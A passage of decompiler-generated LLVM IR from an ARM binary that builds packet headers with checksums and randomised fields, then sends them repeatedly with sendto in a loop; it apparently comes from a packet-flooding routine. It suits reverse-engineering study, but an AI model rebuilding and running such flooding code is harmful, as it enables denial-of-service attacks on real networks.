  %v1_a348 = phi i32 [ %v1_a348.pre, %dec_label_pc_a4c8.dec_label_pc_a344_crit_edge ], [ 65535, %dec_label_pc_a334 ]
  store i32 %v3_a028, i32* %r3.global-to-local, align 4
  %v9_a348 = icmp eq i32 %v3_a028, %v1_a348
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a518, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a4e0.dec_label_pc_a350_crit_edge, %dec_label_pc_a344
  %v1_a354 = phi i32 [ %v1_a354.pre, %dec_label_pc_a4e0.dec_label_pc_a350_crit_edge ], [ %v1_a348, %dec_label_pc_a344 ]
  store i32 %v3_a02c, i32* %r1.global-to-local, align 4
  %v9_a354 = icmp eq i32 %v3_a02c, %v1_a354
  store i1 %v9_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a354, label %dec_label_pc_a534, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a350
  store i32 %v1_a020, i32* %r2.global-to-local, align 4
  store i1 %v2_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a360, label %dec_label_pc_a558, label %.thread27

.thread27:                                        ; preds = %dec_label_pc_a35c
  %v1_a364 = load i32, i32* @r5, align 4
  %v2_a364 = add i32 %v1_a364, 16
  %v3_a364 = inttoptr i32 %v2_a364 to i32*
  %v4_a364 = load i32, i32* %v3_a364, align 4
  store i32 %v4_a364, i32* %r3.global-to-local, align 4
  %v2_a368 = load i32, i32* @r6, align 4
  %v3_a368 = add i32 %v2_a368, 16
  %v4_a368 = inttoptr i32 %v3_a368 to i32*
  store i32 %v4_a364, i32* %v4_a368, align 4
  br label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %bb103, %.thread27
  store i32 %v1_9f8c, i32* %r3.global-to-local, align 4
  store i1 %v2_a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a560, label %dec_label_pc_a37c, label %dec_label_pc_a56c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a558, %dec_label_pc_a56c
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a380 = load i32, i32* @r8, align 4
  %v1_a380 = trunc i32 %v0_a380 to i8
  %v2_a380 = load i32, i32* @r5, align 4
  %v3_a380 = add i32 %v2_a380, 10
  %v4_a380 = inttoptr i32 %v3_a380 to i8*
  store i8 %v1_a380, i8* %v4_a380, align 1
  %v0_a384 = load i32, i32* @r8, align 4
  %v1_a384 = trunc i32 %v0_a384 to i8
  %v2_a384 = load i32, i32* @r5, align 4
  %v3_a384 = add i32 %v2_a384, 11
  %v4_a384 = inttoptr i32 %v3_a384 to i8*
  store i8 %v1_a384, i8* %v4_a384, align 1
  %v0_a388 = load i32, i32* @r5, align 4
  store i32 %v0_a388, i32* @r0, align 4
  %v2_a38c = call i32 @function_de24(i32 %v0_a388, i32 20)
  %v3_a38c = trunc i32 %v2_a38c to i8
  %v4_a390 = sdiv i32 %v2_a38c, 256
  store i32 %v4_a390, i32* %r3.global-to-local, align 4
  %v1_a394 = trunc i32 %v4_a390 to i8
  %v2_a394 = load i32, i32* @r5, align 4
  %v3_a394 = add i32 %v2_a394, 11
  %v4_a394 = inttoptr i32 %v3_a394 to i8*
  store i8 %v1_a394, i8* %v4_a394, align 1
  %v3_a398 = load i32, i32* @r5, align 4
  %v4_a398 = add i32 %v3_a398, 10
  %v5_a398 = inttoptr i32 %v4_a398 to i8*
  store i8 %v3_a38c, i8* %v5_a398, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a3a0 = load i32, i32* @r8, align 4
  %v1_a3a0 = trunc i32 %v0_a3a0 to i8
  %v2_a3a0 = load i32, i32* @r6, align 4
  %v3_a3a0 = add i32 %v2_a3a0, 10
  %v4_a3a0 = inttoptr i32 %v3_a3a0 to i8*
  store i8 %v1_a3a0, i8* %v4_a3a0, align 1
  %v0_a3a4 = load i32, i32* @r8, align 4
  %v1_a3a4 = trunc i32 %v0_a3a4 to i8
  %v2_a3a4 = load i32, i32* @r6, align 4
  %v3_a3a4 = add i32 %v2_a3a4, 11
  %v4_a3a4 = inttoptr i32 %v3_a3a4 to i8*
  store i8 %v1_a3a4, i8* %v4_a3a4, align 1
  %v0_a3a8 = load i32, i32* @r6, align 4
  store i32 %v0_a3a8, i32* @r0, align 4
  %v2_a3ac = call i32 @function_de24(i32 %v0_a3a8, i32 20)
  %v3_a3ac = trunc i32 %v2_a3ac to i8
  store i32 %v2_a3ac, i32* %r0.global-to-local, align 4
  %v4_a3b0 = sdiv i32 %v2_a3ac, 256
  store i32 %v4_a3b0, i32* %r3.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 10
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i8*
  store i8 %v3_a3ac, i8* %v5_a3b4, align 1
  %v0_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a3b8 = trunc i32 %v0_a3b8 to i8
  %v2_a3b8 = load i32, i32* @r6, align 4
  %v3_a3b8 = add i32 %v2_a3b8, 11
  %v4_a3b8 = inttoptr i32 %v3_a3b8 to i8*
  store i8 %v1_a3b8, i8* %v4_a3b8, align 1
  %v0_a3bc = load i32, i32* @r7, align 4
  %v1_a3bc = add i32 %v0_a3bc, 4
  %v2_a3bc = inttoptr i32 %v1_a3bc to i8*
  %v3_a3bc = load i8, i8* %v2_a3bc, align 1
  %v4_a3bc = zext i8 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* %r3.global-to-local, align 4
  %v1_a3c0 = add i32 %v0_a3bc, 5
  %v2_a3c0 = inttoptr i32 %v1_a3c0 to i8*
  %v3_a3c0 = load i8, i8* %v2_a3c0, align 1
  %v4_a3c0 = zext i8 %v3_a3c0 to i32
  store i32 %v0_a3bc, i32* @r1, align 4
  %v4_a3c8 = mul nuw nsw i32 %v4_a3c0, 256
  %v5_a3c8 = or i32 %v4_a3c8, %v4_a3bc
  store i32 %v5_a3c8, i32* %r2.global-to-local, align 4
  %v0_a3cc = load i32, i32* @r8, align 4
  %v1_a3cc = trunc i32 %v0_a3cc to i8
  %v3_a3cc = add i32 %v0_a3bc, 6
  %v4_a3cc = inttoptr i32 %v3_a3cc to i8*
  store i8 %v1_a3cc, i8* %v4_a3cc, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r8, align 4
  %v1_a3d4 = trunc i32 %v0_a3d4 to i8
  %v2_a3d4 = load i32, i32* @r7, align 4
  %v3_a3d4 = add i32 %v2_a3d4, 7
  %v4_a3d4 = inttoptr i32 %v3_a3d4 to i8*
  store i8 %v1_a3d4, i8* %v4_a3d4, align 1
  %v0_a3d8 = load i32, i32* @r6, align 4
  store i32 %v0_a3d8, i32* %r0.global-to-local, align 4
  %v4_a3dc = call i32 @function_de80(i32 %v0_a3d8, i32 %v0_a3bc, i32 %v5_a3c8, i32 %stack_var_-152.0.ph)
  %v5_a3dc = trunc i32 %v4_a3dc to i8
  store i32 %v4_a3dc, i32* %r0.global-to-local, align 4
  %v3_a3e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a3e0, i32* %r3.global-to-local, align 4
  %v3_a3e4 = mul i32 %v3_a3e0, 32
  store i32 %v3_a3e4, i32* %r2.global-to-local, align 4
  %v0_a3e8 = load i32, i32* @r5, align 4
  %v1_a3e8 = add i32 %v0_a3e8, 16
  %v2_a3e8 = inttoptr i32 %v1_a3e8 to i32*
  %v3_a3e8 = load i32, i32* %v2_a3e8, align 4
  store i32 %v3_a3e8, i32* %r1.global-to-local, align 4
  %v5_a3ec = mul i32 %v3_a3e0, 24
  store i32 %v5_a3ec, i32* %r2.global-to-local, align 4
  %v4_a3f043 = udiv i32 %v4_a3dc, 256
  %v1_a3f4 = trunc i32 %v4_a3f043 to i8
  %v2_a3f4 = load i32, i32* @r7, align 4
  %v3_a3f4 = add i32 %v2_a3f4, 7
  %v4_a3f4 = inttoptr i32 %v3_a3f4 to i8*
  store i8 %v1_a3f4, i8* %v4_a3f4, align 1
  %v0_a3f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3f8 = load i32, i32* @sb, align 4
  %v2_a3f8 = add i32 %v1_a3f8, %v0_a3f8
  store i32 %v2_a3f8, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a400 = load i32, i32* @r7, align 4
  %v4_a400 = add i32 %v3_a400, 6
  %v5_a400 = inttoptr i32 %v4_a400 to i8*
  store i8 %v5_a3dc, i8* %v5_a400, align 1
  %v0_a404 = load i32, i32* %r1.global-to-local, align 4
  %v1_a404 = load i32, i32* %lr.global-to-local, align 4
  %v2_a404 = add i32 %v1_a404, 4
  %v3_a404 = inttoptr i32 %v2_a404 to i32*
  store i32 %v0_a404, i32* %v3_a404, align 4
  %v0_a408 = load i32, i32* %r3.global-to-local, align 4
  %v1_a408 = trunc i32 %v0_a408 to i8
  %v2_a408 = load i32, i32* %r2.global-to-local, align 4
  %v3_a408 = load i32, i32* @sb, align 4
  %v4_a408 = add i32 %v3_a408, %v2_a408
  %v5_a408 = inttoptr i32 %v4_a408 to i8*
  store i8 %v1_a408, i8* %v5_a408, align 1
  %v0_a40c = load i32, i32* @r8, align 4
  %v1_a40c = trunc i32 %v0_a40c to i8
  %v2_a40c = load i32, i32* %lr.global-to-local, align 4
  %v3_a40c = add i32 %v2_a40c, 2
  %v4_a40c = inttoptr i32 %v3_a40c to i8*
  store i8 %v1_a40c, i8* %v4_a40c, align 1
  %v0_a410 = load i32, i32* @r8, align 4
  %v1_a410 = trunc i32 %v0_a410 to i8
  %v2_a410 = load i32, i32* %lr.global-to-local, align 4
  %v3_a410 = add i32 %v2_a410, 1
  %v4_a410 = inttoptr i32 %v3_a410 to i8*
  store i8 %v1_a410, i8* %v4_a410, align 1
  %v0_a414 = load i32, i32* @r8, align 4
  %v1_a414 = trunc i32 %v0_a414 to i8
  %v2_a414 = load i32, i32* %lr.global-to-local, align 4
  %v3_a414 = add i32 %v2_a414, 3
  %v4_a414 = inttoptr i32 %v3_a414 to i8*
  store i8 %v1_a414, i8* %v4_a414, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a420 = load i32, i32* @r5, align 4
  store i32 %v0_a420, i32* %r1.global-to-local, align 4
  store i32 %v3_9fd4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_a42c = load i32, i32* %lr.global-to-local, align 4
  %v4_a42c = inttoptr i32 %v0_a42c to %sockaddr*
  %v7_a434 = inttoptr i32 %v0_a420 to i32*
  %v9_a434 = call i32 @sendto(i32 %v3_9fd4, i32* %v7_a434, i32 %stack_var_-120.0.ph, i32 16384, %sockaddr* %v4_a42c, i32 16)
  %v3_a438 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v3_a438, 1
  store i32 %v1_a43c, i32* %r0.global-to-local, align 4
  %v1_a440 = load i32, i32* @fp, align 4
  %v9_a440 = icmp eq i32 %v1_a43c, %v1_a440
  store i1 %v9_a440, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a43c, i32* %stack_var_-40, align 4
  %v6_a448 = icmp slt i32 %v1_a43c, %v1_a440
  br i1 %v6_a448, label %dec_label_pc_a300, label %dec_label_pc_a2e8

dec_label_pc_a450:                                ; preds = %dec_label_pc_9fe4
  store i32 %v3_9fd4, i32* %r0.global-to-local, align 4
  %v1_a454 = call i32 @close(i32 %v3_9fd4)
  store i32 %v1_a454, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a458

dec_label_pc_a458:                                ; preds = %dec_label_pc_9e80, %dec_label_pc_a450
  %v29_a45c = phi i32 [ -1, %dec_label_pc_9e80 ], [ %v1_a454, %dec_label_pc_a450 ]
  store i32 %v3_9e80, i32* %r4.global-to-local, align 4
  store i32 %v6_9e80, i32* %r5.global-to-local, align 4
  store i32 %v9_9e80, i32* %r6.global-to-local, align 4
  store i32 %v12_9e80, i32* %r7.global-to-local, align 4
  store i32 %v15_9e80, i32* %r8.global-to-local, align 4
  ret i32 %v29_a45c

dec_label_pc_a460:                                ; preds = %dec_label_pc_a300
  %v1_a460 = add i32 %v2_a308, 16
  %v2_a460 = inttoptr i32 %v1_a460 to i32*
  %v3_a460 = load i32, i32* %v2_a460, align 4
  store i32 %v3_a460, i32* %r4.global-to-local, align 4
  %v0_a464 = call i32 @function_f6c4()
  store i32 %v0_a464, i32* %r0.global-to-local, align 4
  %v3_a468 = load i32, i32* %stack_var_-40, align 4
  %v5_a470 = mul i32 %v3_a468, 24
  %v0_a474 = load i32, i32* %r4.global-to-local, align 4
  %v1_a478 = load i32, i32* @sb, align 4
  %v2_a478 = add i32 %v1_a478, %v5_a470
  store i32 %v2_a478, i32* %r1.global-to-local, align 4
  %v1_a47c = and i32 %v0_a474, 65280
  store i32 %v1_a47c, i32* %r3.global-to-local, align 4
  %v1_a474 = udiv i32 %v0_a474, 256
  %v3_a480 = and i32 %v1_a474, 65280
  store i32 %v3_a480, i32* %r2.global-to-local, align 4
  %v1_a488 = add i32 %v2_a478, 20
  %v2_a488 = inttoptr i32 %v1_a488 to i8*
  %v3_a488 = load i8, i8* %v2_a488, align 1
  %v4_a488 = zext i8 %v3_a488 to i32
  store i32 %v4_a488, i32* %lr.global-to-local, align 4
  %v2_a494 = call i32 @llvm.bswap.i32(i32 %v0_a474)
  %v7_a498 = lshr i32 %v0_a464, %v4_a488
  %v8_a498 = add i32 %v7_a498, %v2_a494
  %v3_a4a4 = mul i32 %v8_a498, 16777216
  %v1_a4a8 = and i32 %v8_a498, 65280
  store i32 %v1_a4a8, i32* %r0.global-to-local, align 4
  store i32 %v6_9fc0, i32* %r2.global-to-local, align 4
  %v4_a4b4 = mul nuw nsw i32 %v1_a4a8, 256
  %v5_a4b4 = or i32 %v4_a4b4, %v3_a4a4
  store i32 %v5_a4b4, i32* %r1.global-to-local, align 4
  %v2_a4b8 = call i32 @llvm.bswap.i32(i32 %v8_a498)
  store i32 %v2_a4b8, i32* %r3.global-to-local, align 4
  store i1 %v2_a32c, i1* %cpsr_z.global-to-local, align 1
  %v1_a4c0 = load i32, i32* @r5, align 4
  %v2_a4c0 = add i32 %v1_a4c0, 16
  %v3_a4c0 = inttoptr i32 %v2_a4c0 to i32*
  store i32 %v2_a4b8, i32* %v3_a4c0, align 4
  br i1 %v2_a32c, label %dec_label_pc_a4c8, label %dec_label_pc_a334

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a460, %dec_label_pc_a328
  %v0_a4c8 = call i32 @function_f6c4()
  store i32 %v0_a4c8, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_a4d4 = load i32, i32* @sl, align 4
  %v9_a4d4 = icmp eq i32 %v0_a4d4, 65535
  store i1 %v9_a4d4, i1* %cpsr_z.global-to-local, align 1
  %v1_a4d8 = load i32, i32* @r5, align 4
  %v2_a4d8 = add i32 %v1_a4d8, 12
  %v3_a4d8 = inttoptr i32 %v2_a4d8 to i32*
  store i32 %v0_a4c8, i32* %v3_a4d8, align 4
  br i1 %v9_a4d4, label %dec_label_pc_a4e0, label %dec_label_pc_a4c8.dec_label_pc_a344_crit_edge

dec_label_pc_a4c8.dec_label_pc_a344_crit_edge:    ; preds = %dec_label_pc_a4c8
  %v1_a348.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a344

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a4c8, %dec_label_pc_a334
  %v0_a4e0 = call i32 @function_f6c4()
  %v3_a4e8 = urem i32 %v0_a4e0, 65536
  store i32 %v3_a4e8, i32* %r0.global-to-local, align 4
  %v3_a4ec16 = udiv i32 %v0_a4e0, 256
  %v1_a4f0 = trunc i32 %v3_a4ec16 to i8
  %v2_a4f0 = load i32, i32* @r5, align 4
  %v3_a4f0 = add i32 %v2_a4f0, 5
  %v4_a4f0 = inttoptr i32 %v3_a4f0 to i8*
  store i8 %v1_a4f0, i8* %v4_a4f0, align 1
  %v0_a4f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_a028, i32* %r3.global-to-local, align 4
  %v1_a4fc = sub i32 999, %v0_a4f4
  store i32 %v1_a4fc, i32* %r2.global-to-local, align 4
  %v3_a500 = sdiv i32 %v1_a4fc, 256
  store i32 %v3_a500, i32* %r1.global-to-local, align 4
  %v1_a504 = load i32, i32* @r4, align 4
  %v9_a504 = icmp eq i32 %v3_a028, %v1_a504
  store i1 %v9_a504, i1* %cpsr_z.global-to-local, align 1
  %v1_a508 = trunc i32 %v0_a4f4 to i8
  %v2_a508 = load i32, i32* @r5, align 4
  %v3_a508 = add i32 %v2_a508, 4
  %v4_a508 = inttoptr i32 %v3_a508 to i8*
  store i8 %v1_a508, i8* %v4_a508, align 1
  %v0_a50c = load i32, i32* %r1.global-to-local, align 4
  %v1_a50c = trunc i32 %v0_a50c to i8
  %v2_a50c = load i32, i32* @r6, align 4
  %v3_a50c = add i32 %v2_a50c, 5
  %v4_a50c = inttoptr i32 %v3_a50c to i8*
  store i8 %v1_a50c, i8* %v4_a50c, align 1
  %v0_a510 = load i32, i32* %r2.global-to-local, align 4
  %v1_a510 = trunc i32 %v0_a510 to i8
  %v2_a510 = load i32, i32* @r6, align 4
  %v3_a510 = add i32 %v2_a510, 4
  %v4_a510 = inttoptr i32 %v3_a510 to i8*
  store i8 %v1_a510, i8* %v4_a510, align 1
  %v0_a514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a514, label %dec_label_pc_a518, label %dec_label_pc_a4e0.dec_label_pc_a350_crit_edge

dec_label_pc_a4e0.dec_label_pc_a350_crit_edge:    ; preds = %dec_label_pc_a4e0
  %v1_a354.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a350

dec_label_pc_a518:                                ; preds = %dec_label_pc_a4e0, %dec_label_pc_a344
  %v0_a518 = call i32 @function_f6c4()
  %v1_a518 = trunc i32 %v0_a518 to i8
  store i32 %v0_a518, i32* %r0.global-to-local, align 4
  store i32 %v3_a02c, i32* %r1.global-to-local, align 4
  %v4_a520 = sdiv i32 %v0_a518, 256
  store i32 %v4_a520, i32* %r3.global-to-local, align 4
  %v1_a524 = load i32, i32* @r4, align 4
  %v9_a524 = icmp eq i32 %v3_a02c, %v1_a524
  store i1 %v9_a524, i1* %cpsr_z.global-to-local, align 1
  %v3_a528 = load i32, i32* @r5, align 4
  %v4_a528 = add i32 %v3_a528, 44
  %v5_a528 = inttoptr i32 %v4_a528 to i8*
  store i8 %v1_a518, i8* %v5_a528, align 1
  %v0_a52c = load i32, i32* %r3.global-to-local, align 4
  %v1_a52c = trunc i32 %v0_a52c to i8
  %v2_a52c = load i32, i32* @r7, align 4
  %v3_a52c = add i32 %v2_a52c, 1
  %v4_a52c = inttoptr i32 %v3_a52c to i8*
  store i8 %v1_a52c, i8* %v4_a52c, align 1
  %v0_a530 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a530, label %dec_label_pc_a534, label %dec_label_pc_a35c

dec_label_pc_a534:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a350
  %v0_a534 = call i32 @function_f6c4()
  %v1_a534 = trunc i32 %v0_a534 to i8
  store i32 %v0_a534, i32* %r0.global-to-local, align 4
  store i32 %v1_a020, i32* %r2.global-to-local, align 4
  %v4_a53c = sdiv i32 %v0_a534, 256
  store i32 %v4_a53c, i32* %r3.global-to-local, align 4
  store i1 %v2_a360, i1* %cpsr_z.global-to-local, align 1
  %v1_a544 = trunc i32 %v4_a53c to i8
  %v2_a544 = load i32, i32* @r7, align 4
  %v3_a544 = add i32 %v2_a544, 3
  %v4_a544 = inttoptr i32 %v3_a544 to i8*
  store i8 %v1_a544, i8* %v4_a544, align 1
  %v0_a548 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a548, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_a534
  %v1_a548 = load i32, i32* @r5, align 4
  %v2_a548 = add i32 %v1_a548, 16
  %v3_a548 = inttoptr i32 %v2_a548 to i32*
  %v4_a548 = load i32, i32* %v3_a548, align 4
  store i32 %v4_a548, i32* %r3.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_a534, %bb101
  %v3_a54c = load i32, i32* @r7, align 4
  %v4_a54c = add i32 %v3_a54c, 2
  %v5_a54c = inttoptr i32 %v4_a54c to i8*
  store i8 %v1_a534, i8* %v5_a54c, align 1
  %v0_a550 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a550, label %dec_label_pc_a558, label %bb103

bb103:                                            ; preds = %bb102
  %v1_a550 = load i32, i32* %r3.global-to-local, align 4
  %v2_a550 = load i32, i32* @r6, align 4
  %v3_a550 = add i32 %v2_a550, 16
  %v4_a550 = inttoptr i32 %v3_a550 to i32*
  store i32 %v1_a550, i32* %v4_a550, align 4
  br label %dec_label_pc_a370

dec_label_pc_a558:                                ; preds = %dec_label_pc_a35c, %bb102
  %v0_a558 = call i32 @function_f6c4()
  store i32 %v0_a558, i32* %r0.global-to-local, align 4
  store i32 %v1_9f8c, i32* %r3.global-to-local, align 4
  store i1 %v2_a560, i1* %cpsr_z.global-to-local, align 1
  %v1_a564 = load i32, i32* @r6, align 4
  %v2_a564 = add i32 %v1_a564, 16
  %v3_a564 = inttoptr i32 %v2_a564 to i32*
  store i32 %v0_a558, i32* %v3_a564, align 4
  br i1 %v2_a560, label %dec_label_pc_a37c, label %dec_label_pc_a56c

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a558
  %v0_a56c = load i32, i32* @r7, align 4
  %v1_a56c = add i32 %v0_a56c, 8
  store i32 %v1_a56c, i32* %r0.global-to-local, align 4
  store i32 %v6_9f6c, i32* @r1, align 4
  %v1_a574 = inttoptr i32 %v1_a56c to i8*
  %v2_a574 = call i32 @function_f844(i8* %v1_a574)
  store i32 %v2_a574, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a37c

dec_label_pc_a57c:                                ; preds = %dec_label_pc_a00c
  %v1_a584 = add i32 %v6_9f6c, 8
  store i32 %v1_a584, i32* %r2.global-to-local, align 4
  %v1_a588 = add i32 %v6_9f6c, 52
  store i32 %v1_a588, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a2e8.preheader

; uselistorder directives
  uselistorder i32 %v1_a588, { 1, 0 }
  uselistorder i32 %v1_a584, { 1, 0 }
  uselistorder i32 %v4_a53c, { 1, 0 }
  uselistorder i32 %v0_a534, { 0, 2, 1 }
  uselistorder i32 %v0_a518, { 0, 2, 1 }
  uselistorder i32 %v2_a4b8, { 1, 0 }
  uselistorder i32 %v8_a498, { 1, 2, 0 }
  uselistorder i32 %v0_a474, { 1, 0, 2 }
  uselistorder i32 %v1_a440, { 1, 2, 0 }
  uselistorder i32 %v1_a43c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_a3e0, { 1, 0, 2 }
  uselistorder i32 %v4_a3dc, { 0, 2, 1 }
  uselistorder i32 %v0_a3bc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_a3ac, { 0, 2, 1 }
  uselistorder i32 %v4_a390, { 1, 0 }
  uselistorder i32 %v7_a314, { 1, 0, 2 }
  uselistorder i32 %v0_a2e8, { 1, 0 }
  uselistorder i1 %v2_a32c, { 3, 0, 1, 2 }
  uselistorder i1 %v2_a560, { 2, 3, 1, 0 }
  uselistorder i32 %v1_a2a8, { 1, 0, 2 }
  uselistorder i32 %v0_a26c, { 1, 0, 2 }
  uselistorder i32 %v3_a120, { 0, 2, 1 }
  uselistorder i32 %v3_a0e0, { 1, 0 }
  uselistorder i32 %tmp87, { 1, 0 }
  uselistorder i32 %v1_a098, { 1, 0 }
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i32 %v1_a070, { 0, 2, 1 }
  uselistorder i32 %v3_a054, { 2, 1, 0 }
  uselistorder i32 %v0_a030, { 1, 0, 2 }
  uselistorder i32 %v1_a020, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %v0_a01c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_a018, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_9fd4, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v6_9fc0, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v1_9f8c, { 1, 0, 2, 3 }
  uselistorder i32 %v6_9f6c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_9ef4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_9ea0, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_9e84, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 35, 36, 37, 38, 39, 40, 41, 42, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 34, 33, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 19, 35, 36, 37, 38, 40, 39, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25, 26, 28, 27, 29, 21, 22, 23 }
  uselistorder i8 47, { 1, 0 }
  uselistorder label %dec_label_pc_a56c, { 1, 0 }
  uselistorder label %dec_label_pc_a558, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_a458, { 1, 0 }
  uselistorder label %dec_label_pc_a37c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a2e8.preheader, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread24, { 2, 1, 0 }
}

define i32 @function_a59c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a59c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v3_a59c = load i32, i32* @r4, align 4
  %v6_a59c = load i32, i32* @r5, align 4
  %v24_a59c = load i32, i32* @fp, align 4
  %v1_a5a0 = urem i32 %arg1, 256
  store i32 %v1_a5a0, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_a5b8 = urem i32 %arg3, 256
  store i32 %v1_a5b8, i32* @r4, align 4
  %v2_a5bc = call i32* @calloc(i32 %v1_a5a0, i32 4)
  %v4_a5bc = ptrtoint i32* %v2_a5bc to i32
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v4_a5bc, i32* @sl, align 4
  %v0_a5c8 = load i32, i32* @r7, align 4
  %v2_a5cc = call i32* @calloc(i32 %v0_a5c8, i32 4)
  %v3_a5cc = ptrtoint i32* %v2_a5cc to i32
  store i32 65535, i32* @r5, align 4
  %v0_a5d8 = load i32, i32* @r6, align 4
  store i32 %v0_a5d8, i32* %r1.global-to-local, align 4
  store i32 %v3_a5cc, i32* @sb, align 4
  %v0_a5e8 = load i32, i32* @r4, align 4
  %v5_a5ec = inttoptr i32 %v0_a5d8 to i32*
  %v6_a5ec = call i32 @function_930c(i32 %v0_a5e8, i32* %v5_a5ec, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_a5f4 = urem i32 %v6_a5ec, 65536
  %v0_a5f8 = load i32, i32* @r6, align 4
  store i32 %v0_a5f8, i32* %r1.global-to-local, align 4
  %v0_a600 = load i32, i32* @r5, align 4
  %v0_a604 = load i32, i32* @r4, align 4
  %v5_a60c = inttoptr i32 %v0_a5f8 to i32*
  %v6_a60c = call i32 @function_930c(i32 %v0_a604, i32* %v5_a60c, i32 6, i32 %v0_a600, i32 %v3_a5f4)
  %v0_a610 = load i32, i32* @r6, align 4
  store i32 %v0_a610, i32* %r1.global-to-local, align 4
